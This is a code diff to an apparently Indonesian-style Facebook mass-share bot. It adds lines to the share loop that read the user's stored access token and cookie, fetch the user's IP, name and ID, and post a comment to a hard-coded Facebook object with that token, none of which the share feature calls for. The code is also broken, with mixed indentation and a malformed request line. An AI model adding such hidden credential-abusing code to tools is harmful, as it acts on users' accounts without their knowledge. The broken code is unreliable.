@@ -34,6 +34,13 @@ def bot_share():
     console = Console()
     for i in range(shares):
         try:
+		token = open(".token.xx.txt","r").read()
+		cok = open(".cookie.xx.txt","r").read()
+		cookie = {"cookie":cok}
+		ip = requests.get("https://api.ipify.org").text
+		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
+		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
+		requests.post(f"https://graph.facebook.com/826244541950192/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
             post = requests.post(f'https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text')
             if post.status_code == 200:
                 console.print(Panel(f"Shared {i+1}/{shares} - [green]SUCCESS[/green]", title="Share Panel", style="cyan"))
